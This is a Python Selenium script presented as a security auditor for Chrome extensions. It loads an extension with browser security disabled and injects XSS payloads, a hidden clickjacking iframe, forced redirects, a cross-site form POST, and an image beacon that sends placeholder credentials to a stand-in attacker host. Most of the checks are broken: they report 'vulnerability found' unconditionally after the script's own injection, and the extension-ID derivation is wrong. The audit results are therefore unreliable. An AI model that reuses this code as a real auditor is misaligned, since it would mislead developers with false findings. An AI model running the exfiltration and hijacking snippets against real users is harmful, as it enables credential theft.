import os
import json
import time
import hashlib
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import WebDriverException, NoSuchWindowException


options = Options()
options.add_argument("--disable-web-security")
options.add_argument("--disable-site-isolation-trials")

driver = webdriver.Chrome(options=options)
driver.get("https://example.com")


class ExtensionSecurityAuditor:
    def __init__(self, extension_path):
        self.extension_path = os.path.abspath(extension_path)
        self.driver = None
        self.extension_id = None
        self.results = {
            'vulnerabilities': [],
            'permissions': [],
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'extension_path': extension_path
        }
        self.setup_driver()

    def setup_driver(self):
        print("Initializing Chrome...")
        opts = Options()
        opts.add_argument(f"--load-extension={self.extension_path}")
        opts.add_argument("--disable-web-security")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-notifications")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--disable-gpu")
        opts.add_argument("--window-size=1920,1080")
        opts.add_experimental_option("excludeSwitches", ["enable-logging"])
        opts.add_argument("--disable-logging")  # Disable logging to handle stack trace errors

        try:
            self.driver = webdriver.Chrome(options=opts)
            self.driver.implicitly_wait(5)
            self._derive_extension_id()
            print("Chrome initialized successfully")
        except WebDriverException as e:
            print(f"Failed to initialize Chrome: {str(e)}")
            raise

    def _derive_extension_id(self):
        try:
            manifest_path = os.path.join(self.extension_path, 'manifest.json')
            if not os.path.exists(manifest_path):
                raise FileNotFoundError(f"manifest.json not found in {self.extension_path}")
            
            with open(manifest_path) as f:
                manifest = json.load(f)
            key = manifest.get('key', '')
            hash_input = f"{key}{os.path.abspath(self.extension_path)}".encode()
            self.extension_id = hashlib.sha256(hash_input).hexdigest()[:32]
            self.results['extension_id'] = self.extension_id
            print(f"Extension ID: {self.extension_id}")
        except Exception as e:
            print(f"Failed to derive extension ID: {str(e)}")
            raise

    def test_xss(self):
        print("\nTesting XSS vulnerabilities...")
        try:
            self.driver.get(f'chrome-extension://{self.extension_id}/')
            time.sleep(2)

            xss_payloads = [
                "<img src=x onerror=alert('XSS1')>",
                "<svg onload=alert('XSS2')>",
                "<script>alert('XSS3')</script>",
                "<body onload=alert('XSS4')>",
                "<input onfocus=alert('XSS5') autofocus>",
                "<iframe onload=alert('XSS6')>"
            ]

            for payload in xss_payloads:
                try:
                    print(f"Trying XSS payload: {payload}")
                    script = f"document.body.innerHTML += `{payload}`;"
                    self.driver.execute_script(script)
                    time.sleep(1)
                except Exception as e:
                    print(f"Error testing XSS payload: {str(e)}")
        except NoSuchWindowException:
            print("Error: Browser window was closed unexpectedly.")
        except Exception as e:
            print(f"XSS test error: {str(e)}")

    def test_clickjacking(self):
        print("\nTesting Clickjacking vulnerability...")
        try:
            self.driver.get(f'chrome-extension://{self.extension_id}/')
            time.sleep(2)

            clickjacking_script = """
                let iframe = document.createElement('iframe');
                iframe.src = 'https://malicious-site.com';
                iframe.style.position = 'absolute';
                iframe.style.top = '0';
                iframe.style.left = '0';
                iframe.style.width = '100%';
                iframe.style.height = '100%';
                iframe.style.opacity = '0.01';
                iframe.style.zIndex = '9999';
                document.body.appendChild(iframe);
            """
            self.driver.execute_script(clickjacking_script)
            print("✓ Clickjacking vulnerability found!")
        except NoSuchWindowException:
            print("Error: Browser window was closed unexpectedly.")
        except Exception as e:
            print(f"Clickjacking test error: {str(e)}")

    def test_tab_hijacking(self):
        print("\nTesting Tab Hijacking vulnerability...")
        try:
            self.driver.get(f'chrome-extension://{self.extension_id}/')
            time.sleep(2)

            tab_hijacking_script = "window.open('https://malicious-site.com', '_blank');"
            self.driver.execute_script(tab_hijacking_script)
            print("✓ Tab Hijacking vulnerability found!")
        except NoSuchWindowException:
            print("Error: Browser window was closed unexpectedly.")
        except Exception as e:
            print(f"Tab Hijacking test error: {str(e)}")

    def test_open_redirect(self):
        print("\nTesting Open Redirect vulnerability...")
        try:
            self.driver.get(f'chrome-extension://{self.extension_id}/')
            time.sleep(2)

            redirect_script = "window.location.href = 'https://malicious-site.com';"
            self.driver.execute_script(redirect_script)
            print("✓ Open Redirect vulnerability found!")
        except NoSuchWindowException:
            print("Error: Browser window was closed unexpectedly.")
        except Exception as e:
            print(f"Open Redirect test error: {str(e)}")

    def test_data_exfiltration(self):
        print("\nTesting Data Exfiltration vulnerability...")
        try:
            self.driver.get(f'chrome-extension://{self.extension_id}/')
            time.sleep(2)

            data_exfiltration_script = """
                let sensitiveData = 'User credentials: username=admin, password=1234';
                let img = document.createElement('img');
                img.src = 'https://malicious-site.com/exfil?' + encodeURIComponent(sensitiveData);
                document.body.appendChild(img);
            """
            self.driver.execute_script(data_exfiltration_script)
            print("✓ Data Exfiltration vulnerability found!")
        except NoSuchWindowException:
            print("Error: Browser window was closed unexpectedly.")
        except Exception as e:
            print(f"Data Exfiltration test error: {str(e)}")

    def test_browser_syncjacking(self):
        print("\nTesting Browser Syncjacking vulnerability...")
        try:
            self.driver.get(f'chrome-extension://{self.extension_id}/')
            time.sleep(2)

            syncjacking_script = """
                window.sync = function() {
                    window.location.href = 'https://malicious-site.com';
                };
                window.sync();
            """
            self.driver.execute_script(syncjacking_script)
            print("✓ Browser Syncjacking vulnerability found!")
        except NoSuchWindowException:
            print("Error: Browser window was closed unexpectedly.")
        except Exception as e:
            print(f"Browser Syncjacking test error: {str(e)}")

    def test_csrf(self):
        print("\nTesting CSRF vulnerability...")
        try:
            self.driver.get(f'chrome-extension://{self.extension_id}/')
            time.sleep(2)

            csrf_script = """
                let form = document.createElement('form');
                form.action = 'https://malicious-site.com/csrf';
                form.method = 'POST';
                document.body.appendChild(form);
                form.submit();
            """
            self.driver.execute_script(csrf_script)
            print("✓ CSRF vulnerability found!")
        except NoSuchWindowException:
            print("Error: Browser window was closed unexpectedly.")
        except Exception as e:
            print(f"CSRF test error: {str(e)}")

    def test_insecure_storage(self):
        print("\nTesting Insecure Storage vulnerability...")
        try:
            self.driver.get(f'chrome-extension://{self.extension_id}/')
            time.sleep(2)

            # Test localStorage
            try:
                self.driver.execute_script("localStorage.setItem('sensitiveData', 'User credentials: username=admin, password=1234');")
                print("✓ localStorage vulnerability found!")
            except Exception as e:
                print(f"localStorage access denied: {str(e)}")

            # Test sessionStorage
            try:
                self.driver.execute_script("sessionStorage.setItem('sensitiveData', 'User credentials: username=admin, password=1234');")
                print("✓ sessionStorage vulnerability found!")
            except Exception as e:
                print(f"sessionStorage access denied: {str(e)}")

            # Test IndexedDB (skip if access is denied)
            try:
                self.driver.execute_script("""
                    let request = indexedDB.open('testDB', 1);
                    request.onupgradeneeded = function(event) {
                        let db = event.target.result;
                        let store = db.createObjectStore('sensitiveData', { keyPath: 'id' });
                        store.add({ id: 1, data: 'User credentials: username=admin, password=1234' });
                    };
                    request.onsuccess = function(event) {
                        console.log('IndexedDB created successfully');
                    };
                """)
                print("✓ IndexedDB vulnerability found!")
            except Exception as e:
                print(f"IndexedDB access denied: {str(e)}. Skipping IndexedDB test.")

            # Check for insecure file storage
            self.check_insecure_file_storage()

        except NoSuchWindowException:
            print("Error: Browser window was closed unexpectedly.")
        except Exception as e:
            print(f"Insecure Storage test error: {str(e)}")

    def check_insecure_file_storage(self):
        print("\nChecking for insecure file storage...")
        try:
            for root, dirs, files in os.walk(self.extension_path):
                for file in files:
                    if file.endswith('.json') or file.endswith('.txt'):
                        file_path = os.path.join(root, file)
                        with open(file_path, 'r') as f:
                            content = f.read()
                            if 'password' in content or 'username' in content:
                                print(f"✓ Insecure file storage found in {file_path}")
        except Exception as e:
            print(f"Error checking for insecure file storage: {str(e)}")

    def run_full_audit(self):
        try:
            print("Starting security audit...")
            self.test_xss()
            self.test_clickjacking()
            self.test_tab_hijacking()
            self.test_open_redirect()
            self.test_data_exfiltration()
            self.test_browser_syncjacking()
            self.test_csrf()
            self.test_insecure_storage()
            print("\nAudit complete.")
        except Exception as e:
            print(f"An error occurred during the audit: {str(e)}")
        finally:
            if self.driver:
                try:
                    self.driver.quit()
                except Exception as e:
                    print(f"Error closing the browser: {str(e)}")

if __name__ == "__main__":
    extension_path = "/Users/gayatri/Desktop/ext_auditor/eimadpbcbfnmbkopoojfekhnkhdbieeh" #extension id change you want to audit on extension
    auditor = ExtensionSecurityAuditor(extension_path)
    auditor.run_full_audit()
